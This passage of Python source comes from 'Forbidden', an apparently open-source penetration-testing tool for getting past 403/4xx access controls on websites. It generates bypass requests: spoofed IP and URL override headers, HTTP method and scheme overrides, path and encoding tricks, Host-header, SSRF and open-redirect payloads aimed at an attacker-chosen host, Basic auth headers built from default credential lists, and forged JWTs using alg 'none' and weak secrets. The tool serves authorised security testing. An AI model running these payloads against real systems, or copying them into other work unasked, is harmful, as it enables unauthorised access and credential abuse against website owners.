			# NOTE: Test open redirects, OOB, and SSRF.
			self.__records(
				identifier = "REDIRECTS-1",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_url_headers(self.__get_redirect_urls(scheme = True, ip = False))
			)
			# NOTE: Test open redirects, OOB, and SSRF.
			self.__records(
				identifier = "REDIRECTS-2",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_ip_headers(self.__get_redirect_urls(scheme = False, ip = False) + self.__get_redirect_urls(scheme = False, ip = True))
			)
		# --------------------------------
		if self.__check_tests(["parsers", "all"]):
			# NOTE: Test broken URL parsers, OOB, and SSRF.
			self.__records(
				identifier = "PARSERS-1",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_url_headers(self.__get_broken_urls(scheme = True, ip = False))
			)
			# NOTE: Test broken URL parsers, OOB, and SSRF.
			self.__records(
				identifier = "PARSERS-2",
				urls       = self.__url["urls"]["base"],
				headers    = self.__get_ip_headers(self.__get_broken_urls(scheme = False, ip = False) + self.__get_broken_urls(scheme = False, ip = True))
			)

	def __get_methods(self):
		tmp = [
			"ACL",
			"ARBITRARY",
			"BASELINE-CONTROL",
			"BIND",
			"CHECKIN",
			"CHECKOUT",
			"CONNECT",
			"COPY",
			# "DELETE", # NOTE: This HTTP method is dangerous!
			"GET",
			"HEAD",
			"INDEX",
			"LABEL",
			"LINK",
			"LOCK",
			"MERGE",
			"MKACTIVITY",
			"MKCALENDAR",
			"MKCOL",
			"MKREDIRECTREF",
			"MKWORKSPACE",
			"MOVE",
			"OPTIONS",
			"ORDERPATCH",
			"PATCH",
			"POST",
			"PRI",
			"PROPFIND",
			"PROPPATCH",
			"PUT",
			"REBIND",
			"REPORT",
			"SEARCH",
			"SHOWMETHOD",
			"SPACEJUMP",
			"TEXTSEARCH",
			"TRACE",
			"TRACK",
			"UNBIND",
			"UNCHECKOUT",
			"UNLINK",
			"UNLOCK",
			"UPDATE",
			"UPDATEREDIRECTREF",
			"VERSION-CONTROL"
		]
		return unique(tmp)

	def __get_file_upload_urls(self, files):
		tmp = []
		scheme_domain_paths = append_paths(self.__url["scheme_domain"], get_recursive_paths(self.__url["path"]))
		scheme_domain_path_files = append_paths(scheme_domain_paths, files)
		for scheme_domain_path_file in scheme_domain_path_files:
			tmp.append(scheme_domain_path_file + self.__url["query"]["full"] + self.__url["fragment"]["full"])
		return unique(tmp)

	def __get_method_override_headers(self):
		tmp = []
		headers = [
			"X-HTTP-Method",
			"X-HTTP-Method-Override",
			"X-Method-Override"
		]
		for header in headers:
			for method in self.__get_methods():
				tmp.append(("{0}: {1}").format(header, method))
		return unique(tmp)

	def __get_method_override_urls(self):
		tmp = []
		parameters = [
			"x-http-method-override",
			"x-method-override"
		]
		for parameter in parameters:
			url = copy.deepcopy(self.__url)
			if parameter in url["query"]["parsed"]:
				# NOTE: In case of duplicate parameters in the URL query string, replace only the last one.
				# NOTE: URL query string is case-sensitive.
				separator = "?"
				for method in self.__get_methods():
					url["query"]["parsed"][parameter][-1] = method
					query = separator + urllib.parse.urlencode(url["query"]["parsed"], doseq = True)
					tmp.append(url["scheme_domain"] + url["path"] + query + url["fragment"]["full"])
			else:
				separator = "&" if url["query"]["parsed"] else "?"
				for method in self.__get_methods():
					url["query"]["parsed"][parameter] = [method]
					query = separator + urllib.parse.urlencode(url["query"]["parsed"], doseq = True)
					tmp.append(url["scheme_domain"] + url["path"] + query + url["fragment"]["full"])
		return unique(tmp)

	def __get_scheme_override_headers(self, scheme):
		tmp = []
		# --------------------------------
		headers = [
			"X-Forwarded-Proto",
			"X-Forwarded-Protocol",
			"X-Forwarded-Scheme",
			"X-Scheme",
			"X-URL-Scheme"
		]
		for header in headers:
			tmp.append(("{0}: {1}").format(header, scheme))
		# --------------------------------
		headers = [
			"Front-End-HTTPS",
			"X-Forwarded-SSL"
		]
		status = "on" if scheme == "https" else "off"
		for header in headers:
			tmp.append(("{0}: {1}").format(header, status))
		# --------------------------------
		return unique(tmp)

	def __get_port_override_headers(self):
		tmp = []
		headers = [
			"X-Forwarded-Port"
		]
		for header in headers:
			for port in [self.__url["port"], 80, 443, 4443, 8008, 8080, 8403, 8443, 9008, 9080, 9403, 9443]:
				tmp.append(("{0}: {1}").format(header, port))
		return unique(tmp)

	def __get_url_headers(self, values):
		tmp = []
		# --------------------------------
		headers = [
			"19-Profile",
			"Base-URL",
			"Destination",
			"Origin",
			"Profile",
			"Proxy",
			"Referer",
			"Request-URI",
			"URI",
			"URL",
			"WAP-Profile",
			"X-Forwarded-Path",
			"X-HTTP-DestinationURL",
			"X-Original-URL",
			"X-Override-URL",
			"X-Proxy-URL",
			"X-Referer",
			"X-Rewrite-URL",
			"X-Wap-Profile"
		]
		for header in headers:
			for value in values:
				tmp.append(("{0}: {1}").format(header, value))
		# --------------------------------
		return unique(tmp)

	def __get_ip_headers(self, values):
		tmp = []
		# --------------------------------
		headers = [
			"CF-Connecting-IP",
			"Client-IP",
			"Cluster-Client-IP",
			"Forwarded-For",
			"Forwarded-For-IP",
			"Host",
			"Incap-Client-IP",
			"Proxy",
			"Redirect",
			"Remote-Addr",
			"True-Client-IP",
			"X-Client-IP",
			"X-Cluster-Client-IP",
			"X-Forwarded",
			"X-Forwarded-By",
			"X-Forwarded-For",
			"X-Forwarded-For-Original",
			"X-Forwarded-Host",
			"X-Forwarded-Server",
			"X-HTTP-Host-Override",
			"X-Host",
			"X-Host-Override",
			"X-Original-Forwarded-For",
			"X-Original-Remote-Addr",
			"X-Originally-Forwarded-For",
			"X-Originating-IP",
			"X-Proxy-Host",
			"X-ProxyUser-IP",
			"X-Real-IP",
			"X-Remote-Addr",
			"X-Remote-IP",
			"X-Requested-With",
			"X-Server-IP",
			"X-True-Client-IP",
			"X-True-IP"
		]
		for header in headers:
			for value in values:
				tmp.append(("{0}: {1}").format(header, value))
		# --------------------------------
		headers = [
			"Forwarded"
		]
		for header in headers:
			for value in values:
				tmp.append(("{0}: for=\"{1}\"").format(header, value.replace("\"", "\\\"")))
		# --------------------------------
		headers = [
			"X-Custom-IP-Authorization"
		]
		injections = ["", ";", ".;", "..;"]
		for header in headers:
			for value in values:
				for injection in injections:
					tmp.append(("{0}: {1}").format(header, value + injection))
		# --------------------------------
		headers = [
			"X-Originating-IP"
		]
		for header in headers:
			for value in values:
				tmp.append(("{0}: [{1}]").format(header, value))
		# --------------------------------
		return unique(tmp)

	def __get_special_headers(self):
		tmp = []
		# --------------------------------
		headers = [
			"From"
		]
		for header in headers:
			for value in [self.__url["domain_no_port"], self.__evil["domain_no_port"]]:
				tmp.append(("{0}: pentest@{1}").format(header, value))
		# --------------------------------
		headers = [
			"Profile"
		]
		for header in headers:
			for value in [self.__url["scheme_domain"], self.__evil["scheme_domain"]]:
				tmp.append(("{0}: <{0}/profile/pentest>").format(header, value))
		# --------------------------------
		headers = [
			"X-Requested-With"
		]
		for header in headers:
			for value in ["XMLHttpRequest"]:
				tmp.append(("{0}: {0}").format(header, value))
		# --------------------------------
		return unique(tmp)

	def __get_all_headers(self, values):
		return unique(self.__get_url_headers(values) + self.__get_ip_headers(values))

	def __get_localhost_urls(self):
		return get_all_domains(self.__url["scheme"], ["localhost", "127.0.0.1", unicode_encode("127.0.0.1"), "127.000.000.001"], self.__url["port"])

	def __get_random_urls(self):
		return get_all_domains(self.__url["scheme"], ["192.168.1.1", "172.16.1.1", "173.245.48.1", "10.1.1.1"], self.__url["port"])

	def __get_all_values(self, scheme = True, ip = False):
		tmp = []
		domain_extended = "ip_extended" if ip else "domain_extended"
		localhost = "127.0.0.1" if ip else "localhost"
		temp = strip_url_schemes(self.__get_localhost_urls() + self.__get_random_urls() + self.__url[domain_extended])
		if scheme:
			tmp.extend([("{0}://{1}").format(self.__url["scheme"], entry + self.__url["path_full"]) for entry in temp])
		else:
			tmp += temp
		temp = strip_url_schemes(self.__evil[domain_extended])
		if scheme:
			tmp.extend([("{0}://{1}").format(self.__evil["scheme"], entry + self.__url["path_full"]) for entry in temp])
		else:
			tmp += temp
		if not scheme:
			for override in strip_url_schemes(self.__url[domain_extended] + self.__evil[domain_extended]):
				for initial in strip_url_schemes([localhost, ("{0}:{1}").format(localhost, self.__url["port"])]):
					tmp.append(("{0},{1}").format(initial, override))
		return unique(tmp)

	def __get_double_host_header(self, ip = False):
		tmp = []
		domain_extended = "ip_extended" if ip else "domain_extended"
		exists = set()
		for override in strip_url_schemes(self.__evil[domain_extended]):
			for initial in strip_url_schemes(self.__url[domain_extended]):
				exist = initial + override
				if exist not in exists and not exists.add(exist):
					tmp.append([
						("Host: {0}").format(initial),
						("Host: {0}").format(override)
					])
		return tmp

	def __get_path_bypass_urls(self):
		path_bypasses = []
		# --------------------------------
		path = self.__url["path"].strip(path_const)
		# --------------------------------
		# NOTE: Inject at the beginning, end, and both, beginning and end of the URL path.
		# NOTE: All possible combinations.
		injections = []
		for i in ["", "%09", "%20", "%23", "%2e", "*", ".", "..", ";", ".;", "..;", ";foo=bar;"]:
			injections.extend([path_const + i + path_const, i + path_const, path_const + i, i])
		for i in injections:
			path_bypasses.extend([path + i, i + path])
			if path:
				for j in injections:
					path_bypasses.extend([i + path + j])
		# --------------------------------
		# NOTE: Inject at the end of the URL path.
		injections = []
		for i in ["#", "*", ".", "?", "~"]:
			injections.extend([i, i + i, ("{0}random").format(i)])
		paths = [path, path + path_const]
		for p in paths:
			for i in injections:
				path_bypasses.extend([p + i])
		# --------------------------------
		# NOTE: Inject at the end of the URL path only if it does not end with forward slash.
		if path and not self.__url["path"].endswith(path_const):
			injections = ["asp", "aspx", "esp", "html", "jhtml", "json", "jsp", "jspa", "jspx", "php", "sht", "shtml", "xhtml", "xml"]
			for i in injections:
				path_bypasses.extend([("{0}.{1}").format(path, i)])
		# --------------------------------
		tmp = []
		for path_bypass in path_bypasses:
			tmp.append(self.__url["scheme_domain"] + prepend_slash(path_bypass) + self.__url["query"]["full"] + self.__url["fragment"]["full"])
		return unique(tmp)

	def __get_encoded_urls(self):
		tmp = []
		domains = get_encoded_domains(self.__url["domain_no_port"], self.__url["port"])
		for domain in domains:
			tmp.append(("{0}://{1}").format(self.__url["scheme"], domain + self.__url["path_full"]))
		if self.__url["path"]:
			paths = get_encoded_paths(self.__url["path"])
			for path in paths:
				tmp.append(self.__url["scheme_domain"] + path + self.__url["query"]["full"] + self.__url["fragment"]["full"])
			for domain in domains:
				for path in paths:
					tmp.append(("{0}://{1}").format(self.__url["scheme"], domain + path + self.__url["query"]["full"] + self.__url["fragment"]["full"]))
		return unique(tmp)

	def __get_basic_auth_headers(self):
		tmp = []
		headers = [
			"Authorization"
		]
		values = ["", "null", "None", "nil"]
		usernames = ["admin", "cisco", "gateway", "guest", "jigsaw", "root", "router", "switch", "tomcat", "wampp", "xampp", "sysadmin"]
		passwords = ["admin", "cisco", "default", "gateway", "guest", "jigsaw", "password", "root", "router", "secret", "switch", "tomcat", "toor", "wampp", "xampp", "sysadmin"]
		for username in usernames:
			for password in passwords:
				values.append(b64(("{0}:{1}").format(username, password)))
		for header in headers:
			for value in values:
				tmp.append(("{0}: Basic {1}").format(header, value))
		return unique(tmp)

	def __get_bearer_auth_headers(self):
		tmp = []
		headers = [
			"Authorization"
		]
		values = ["", "null", "None", "nil",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0.eyJhZG1pbiI6dHJ1ZX0.",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJuT25FIn0.eyJhZG1pbiI6dHJ1ZX0.",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.5kp9eqTFR4hoHAIvHXgXXnLE8aJUoJVS4AV4t7uO5eU",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.emvct89GULwEkl5Jur3Y2JADuP8piGzUxFG5mantrUU",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.ZvSy_JmkGvnKi908ZblUyq6mRPHgaiCs9n4o2N4Lp10",
			"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0.MAYCAQACAQA"
		]
		for url in [self.__url["scheme_domain"], self.__evil["scheme_domain"]]:
			for secret in ["secret", b64("secret")]:
				values.append(jwt.encode({"admin": True}, secret, algorithm = "HS256", headers = {"jku": url}))
		for header in headers:
			for value in values:
				tmp.append(("{0}: Bearer {1}").format(header, value))
		return unique(tmp)

	def __get_redirect_urls(self, scheme = True, ip = False):
		tmp = []
		domain_extended = "ip_extended" if ip else "domain_extended"
		domain_no_port = "ip_no_port" if ip else "domain_no_port"
		injections = [path_const, ("{0}.").format(path_const)]
		for override in strip_url_schemes(self.__evil[domain_extended]):
			tmp.append(override)
			for injection in injections:
				tmp.append(override + injection + self.__url[domain_no_port])
			if not ip:
				tmp.append(("{0}.{1}").format(self.__url[domain_no_port], override))
		if scheme:
			tmp = [("{0}://{1}").format(self.__evil["scheme"], entry + self.__url["path_full"]) for entry in tmp]
		return unique(tmp)

	def __get_broken_urls(self, scheme = True, ip = False):
		tmp = []
		domain_extended = "ip_extended" if ip else "domain_extended"
		at_const = "@"
		injections = [at_const, (" {0}").format(at_const), ("#{0}").format(at_const)]
		for override in strip_url_schemes(self.__evil[domain_extended]):
			for initial in strip_url_schemes(self.__url[domain_extended]):
				for injection in injections:
					tmp.append(initial + injection + override)
		if scheme:
			tmp = [("{0}://{1}").format(self.__evil["scheme"], entry + self.__url["path_full"]) for entry in tmp]
		return unique(tmp)

# ----------------------------------------

class Table:

	def __init__(self, collection):
		self.__table = self.__init_table(collection)

	def __init_table(self, collection):
		table = {}
		for record in collection:
			if record["code"] not in table:
				table[record["code"]] = 0
			table[record["code"]] += 1
		return dict(sorted(table.items()))

	def __row(self, code, count, color):
		return [
			("{0}{1}{2}").format(color, code, colorama.Style.RESET_ALL),
			("{0}{1}{2}").format(color, count, colorama.Style.RESET_ALL)
		]

	def show(self):
		tmp = []
		for code, count in self.__table.items():
			if code >= 500:
				tmp.append(self.__row(code, count, colorama.Fore.CYAN))
			elif code >= 400:
				tmp.append(self.__row(code, count, colorama.Fore.RED))
			elif code >= 300:
				tmp.append(self.__row(code, count, colorama.Fore.YELLOW))
			elif code >= 200:
				tmp.append(self.__row(code, count, colorama.Fore.GREEN))
			elif code > 0:
				tmp.append(self.__row(code, count, colorama.Fore.WHITE))
			elif code == 0:
				tmp.append(self.__row("Errors", count, colorama.Fore.WHITE))
			elif code == -1:
				tmp.append(self.__row("Ignored", count, colorama.Fore.WHITE))
			elif code == -2:
				tmp.append(self.__row("Duplicates", count, colorama.Fore.WHITE))
		if tmp:
			print(tabulate.tabulate(tmp, ["Code", "Count"], tablefmt = "outline", colalign = ("left", "left")))

# ----------------------------------------

class Progress:

	def __init__(self, total, print_lock):
		self.__total      = total
		self.__count      = 0
		self.__print_lock = print_lock

	def show(self):
		with self.__print_lock:
			print(("Progress: {0}/{1} | {2:.2f}%").format(self.__count, self.__total, (self.__count / self.__total) * 100), end = "\n" if self.__count == self.__total else "\r")
			self.__count += 1

# ----------------------------------------

class MyArgParser(argparse.ArgumentParser):
	
	def print_help(self):
		print("Forbidden v10.6 ( github.com/ivan-sincek/forbidden )")
		print("")
		print("Usage:   forbidden -u url                       -t tests [-f force] [-v values    ] [-p path ] [-o out         ]")
		print("Example: forbidden -u https://example.com/admin -t all   [-f POST ] [-v values.txt] [-p /home] [-o results.json]")
		print("")
		print("DESCRIPTION")
		print("    Bypass 4xx HTTP response status codes and more")
		print("URL")
		print("    Inaccessible URL")
		print("    -u, --url = https://example.com/admin | etc.")
		print("IGNORE QUERY STRING AND FRAGMENT")
		print("    Ignore URL query string and fragment")
		print("    -iqsf, --ignore-query-string-and-fragment")
		print("IGNORE CURL")
		print("    Ignore PycURL, use Python Requests instead")
		print("    -ic, --ignore-curl")
		print("TESTS")
		print("    Tests to run")
		print("    Use comma-separated values")
		print("    -t, --tests = base | methods | [method|scheme|port]-overrides | headers | paths | encodings | auths | redirects | parsers | all")
		print("FORCE")
		print("    Force an HTTP method for all non-specific test cases")
		print("    -f, --force = GET | POST | CUSTOM | etc.")
		print("VALUES")
		print("    File with additional HTTP request header values such as internal IPs, etc.")
		print("    Spacing will be stripped, empty lines ignored, and duplicates removed")
		print("    Tests: headers")
		print("    -v, --values = values.txt | etc.")
		print("PATH")
		print("    Accessible URL path to test URL overrides")
		print("    Tests: headers")
		print("    Default: /robots.txt | /index.html | /sitemap.xml | /README.txt")
		print("    -p, --path = /home | etc.")
		print("EVIL")
		print("    Evil URL to test URL overrides")
		print("    Tests: headers | redirects")
		print("    Default: https://github.com")
		print("    -e, --evil = https://xyz.interact.sh | https://xyz.burpcollaborator.net | etc.")
		print("IGNORE")
		print("    Filter out 200 OK false positive results with RegEx")
		print("    Spacing will be stripped")
		print("    -i, --ignore = Inaccessible | \"Access Denied\" | etc.")
		print("CONTENT LENGTHS")
		print("    Filter out 200 OK false positive results by HTTP response content lengths")
		print("    Specify 'base' to ignore content length of the base HTTP response")
		print("    Specify 'path' to ignore content length of the accessible URL response")
		print("    Use comma-separated values")
		print("    -l, --content-lengths = 12 | base | path | etc.")
		print("REQUEST TIMEOUT")
		print("    Request timeout")
		print("    Default: 60")
		print("    -rt, --request-timeout = 30 | etc.")
		print("THREADS")
		print("    Number of parallel threads to run")
		print("    More threads make it run faster but also might return more false positive results")
		print("    Greatly impacted by internet connectivity speed and server capacity")
		print("    Default: 5")
		print("    -th, --threads = 20 | etc.")
		print("SLEEP")
		print("    Sleep in milliseconds before sending an HTTP request")
		print("    Intended for a single-thread use")
		print("    -s, --sleep = 500 | etc.")
		print("USER AGENT")
		print("    User agent to use")
		print(("    Default: {0}").format(default_user_agent))
		print("    -a, --user-agent = curl/3.30.1 | random[-all] | etc.")
		print("PROXY")
		print("    Web proxy to use")
		print("    -x, --proxy = http://127.0.0.1:8080 | etc.")
		print("OUT")
		print("    Output file")
		print("    -o, --out = results.json | etc.")
		print("DEBUG")
		print("    Debug output")
		print("    -dbg, --debug")

	def error(self, message):
		if len(sys.argv) > 1:
			print("Missing a mandatory option (-u, -t) and/or optional (-iqsf, -ic, -f, -v, -p, -e, -i, -l, -rt, -th, -s, -a, -x, -o, -dbg)")
			print("Use -h or --help for more info")
		else:
			self.print_help()
		exit()

class Validate:

	def __init__(self):
		self.__proceed = True
		self.__parser  = MyArgParser()
		self.__parser.add_argument("-u"   , "--url"                             , required = True , type   = str         , default = ""   )
		self.__parser.add_argument("-iqsf", "--ignore-query-string-and-fragment", required = False, action = "store_true", default = False)
		self.__parser.add_argument("-ic"  , "--ignore-curl"                     , required = False, action = "store_true", default = False)
		self.__parser.add_argument("-t"   , "--tests"                           , required = True , type   = str.lower   , default = ""   )
		self.__parser.add_argument("-f"   , "--force"                           , required = False, type   = str.upper   , default = ""   )
		self.__parser.add_argument("-v"   , "--values"                          , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-p"   , "--path"                            , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-e"   , "--evil"                            , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-i"   , "--ignore"                          , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-l"   , "--content-lengths"                 , required = False, type   = str.lower   , default = ""   )
		self.__parser.add_argument("-rt"  , "--request-timeout"                 , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-th"  , "--threads"                         , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-s"   , "--sleep"                           , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-a"   , "--user-agent"                      , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-x"   , "--proxy"                           , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-o"   , "--out"                             , required = False, type   = str         , default = ""   )
		self.__parser.add_argument("-dbg" , "--debug"                           , required = False, action = "store_true", default = False)

	def run(self):
		self.__args                 = self.__parser.parse_args()
		self.__args.url             = self.__parse_url(self.__args.url, "url")                  # required
		self.__args.tests           = self.__parse_tests(self.__args.tests)                     # required
		self.__args.values          = self.__parse_values(self.__args.values)                   if self.__args.values          else []
		self.__args.path            = self.__parse_path(self.__args.path)                       if self.__args.path            else ["/robots.txt", "/index.html", "/sitemap.xml", "/README.txt"]
		self.__args.evil            = self.__parse_url(self.__args.evil, "evil")                if self.__args.evil            else "https://github.com"
		self.__args.ignore          = self.__parse_ignore(self.__args.ignore)                   if self.__args.ignore          else ""
		self.__args.content_lengths = self.__parse_content_lengths(self.__args.content_lengths) if self.__args.content_lengths else []
		self.__args.request_timeout = self.__parse_request_timeout(self.__args.request_timeout) if self.__args.request_timeout else 60
		self.__args.threads         = self.__parse_threads(self.__args.threads)                 if self.__args.threads         else 5
		self.__args.sleep           = self.__parse_sleep(self.__args.sleep)                     if self.__args.sleep           else 0
		self.__args.user_agent      = self.__parse_user_agent(self.__args.user_agent)           if self.__args.user_agent      else [default_user_agent]
		self.__args.proxy           = self.__parse_url(self.__args.proxy, "proxy")              if self.__args.proxy           else ""
		self.__args                 = vars(self.__args)
		return self.__proceed

	def get_arg(self, key):
		return self.__args[key]

	def __error(self, msg):
		self.__proceed = False
		self.__print_error(msg)

	def __print_error(self, msg):
		print(("ERROR: {0}").format(msg))

	def __parse_url(self, value, key):
		data = {
			"url": {
				"schemes": ["http", "https"],
				"scheme_error": [
					"Inaccessible URL: Scheme is required",
					"Inaccessible URL: Supported schemes are 'http' and 'https'"
				],
				"domain_error": "Inaccessible URL: Invalid domain name",
				"port_error": "Inaccessible URL: Port number is out of range"
			},
			"evil": {
				"schemes": ["http", "https"],
				"scheme_error": [
					"Evil URL: Scheme is required",
					"Evil URL: Supported schemes are 'http' and 'https'"
				],
				"domain_error": "Evil URL: Invalid domain name",
				"port_error": "Evil URL: Port number is out of range"
			},
			"proxy": {
				"schemes": ["http", "https", "socks4", "socks4h", "socks5", "socks5h"],
				"scheme_error": [
					"Proxy URL: Scheme is required",
					"Proxy URL: Supported schemes are 'http[s]', 'socks4[h]', and 'socks5[h]'"
				],
				"domain_error": "Proxy URL: Invalid domain name",
				"port_error": "Proxy URL: Port number is out of range"
			}
		}
		tmp = urllib.parse.urlsplit(value)
		if not tmp.scheme:
			self.__error(data[key]["scheme_error"][0])
		elif tmp.scheme not in data[key]["schemes"]:
			self.__error(data[key]["scheme_error"][1])
		elif not tmp.netloc:
			self.__error(data[key]["domain_error"])
		elif tmp.port and (tmp.port < 1 or tmp.port > 65535):
			self.__error(data[key]["port_error"])
		return value

	def __parse_tests(self, value):
		tmp = []
		for entry in value.lower().split(","):
			entry = entry.strip()
			if not entry:
				continue
			elif entry not in ["base", "methods", "method-overrides", "scheme-overrides", "port-overrides", "headers", "paths", "encodings", "auths", "redirects", "parsers", "all"]:
				self.__error("Supported tests are 'base', 'methods', '[method|scheme|port]-overrides', 'headers', 'paths', 'encodings', 'auths', 'redirects', 'parsers', or 'all'")
				break
			elif entry == "all":
				tmp = [entry]
				break
			else:
				tmp.append(entry)
		return unique(tmp)

	def __parse_values(self, value):
		tmp = []
		if not os.path.isfile(value):
			self.__error("File with additional values does not exists")
		elif not os.access(value, os.R_OK):
			self.__error("File with additional values does not have a read permission")
		elif not os.stat(value).st_size > 0:
			self.__error("File with additional values is empty")
		else:
			tmp = read_file(value)
			if not tmp:
				self.__error("No additional values were found")
		return tmp

	def __parse_path(self, value):
		return [prepend_slash(replace_multiple_slashes(value))]

	def __parse_ignore(self, value):
		try:
			re.compile(value)
		except re.error:
			self.__error("Invalid RegEx")
		return value

	def __parse_content_lengths(self, value):
		tmp = []
		for entry in value.lower().split(","):
			entry = entry.strip()
			if not entry:
				continue
			elif entry in ["base", "path"]:
				tmp.append(entry)
			elif not entry.isdigit() or int(entry) < 0:
				self.__error("Content lengths must be either 'base', 'path', or numeric equal or greater than zero")
				break
			else:
				tmp.append(int(entry))
		return unique(tmp)

	def __parse_request_timeout(self, value):
		if not value.isdigit():
			self.__error("Request timeout must be numeric")
		else:
			value = int(value)
			if value <= 0:
				self.__error("Request timeout must be greater than zero")
		return value

	def __parse_threads(self, value):
		if not value.isdigit():
			self.__error("Number of parallel threads to run must be numeric")
		else:
			value = int(value)
			if value <= 0:
				self.__error("Number of parallel threads to run must be greater than zero")
		return value

	def __parse_sleep(self, value):
		if not value.isdigit():
			self.__error("Sleep must be numeric")
		else:
			value = int(value) / 1000
			if value <= 0:
				self.__error("Sleep must be greater than zero")
		return value

	def __parse_user_agent(self, value):
		lower = value.lower()
		if lower == "random-all":
			return get_all_user_agents()
		elif lower == "random":
			return [get_random_user_agent()]
		else:
			return [value]

# ----------------------------------------

def main():
	validate = Validate()
	if validate.run():
		print("###########################################################################")
		print("#                                                                         #")
		print("#                             Forbidden v10.6                             #")
		print("#                                  by Ivan Sincek                         #")
		print("#                                                                         #")
		print("# Bypass 4xx HTTP response status codes and more.                         #")
		print("# GitHub repository at github.com/ivan-sincek/forbidden.                  #")
		print("# Feel free to donate ETH at 0xbc00e800f29524AD8b0968CEBEAD4cD5C5c1f105.  #")
		print("#                                                                         #")
		print("###########################################################################")
		out = validate.get_arg("out")
		forbidden = Forbidden(
			validate.get_arg("url"),
			validate.get_arg("ignore_query_string_and_fragment"),
			validate.get_arg("ignore_curl"),
			validate.get_arg("tests"),
			validate.get_arg("force"),
			validate.get_arg("values"),
			validate.get_arg("path"),
			validate.get_arg("evil"),
			validate.get_arg("ignore"),
			validate.get_arg("content_lengths"),
			validate.get_arg("request_timeout"),
			validate.get_arg("threads"),
			validate.get_arg("sleep"),
			validate.get_arg("user_agent"),
			validate.get_arg("proxy"),
			validate.get_arg("debug")
		)
		forbidden.run()
		results = forbidden.get_results()
		if results and out:
			write_file(jdump(results), out)
		stopwatch.stop()

if __name__ == "__main__":
	main()
